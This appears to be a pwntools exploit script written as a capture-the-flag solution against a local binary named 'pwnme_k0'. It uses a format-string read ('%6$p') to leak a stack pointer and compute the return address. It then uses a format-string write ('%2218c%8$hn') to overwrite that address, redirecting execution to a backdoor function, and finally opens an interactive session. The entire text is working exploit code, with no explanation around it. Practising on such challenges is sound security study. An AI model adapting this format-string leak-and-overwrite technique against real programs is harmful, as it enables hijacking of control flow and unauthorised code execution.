from pwn import *

#context.log_level = 'debug'
io = process("./pwnme_k0")

backdoor = 0x4008AA

payload = '%6$p'

io.sendlineafter(': \n', 'XiaozaYa')
io.sendlineafter(': \n', payload)

io.sendlineafter('>', '1')
io.recvuntil('XiaozaYa\n')
rbp = int(io.recvline(), 16)
ret_addr = rbp - 0x38
print hex(rbp)
print hex(ret_addr)

payload = '%2218c' + '%8$hn'
io.sendlineafter('>', '2')
io.sendlineafter(': \n', p64(ret_addr))
io.sendlineafter(': \n', payload)
io.sendlineafter('>', '1')
io.interactive()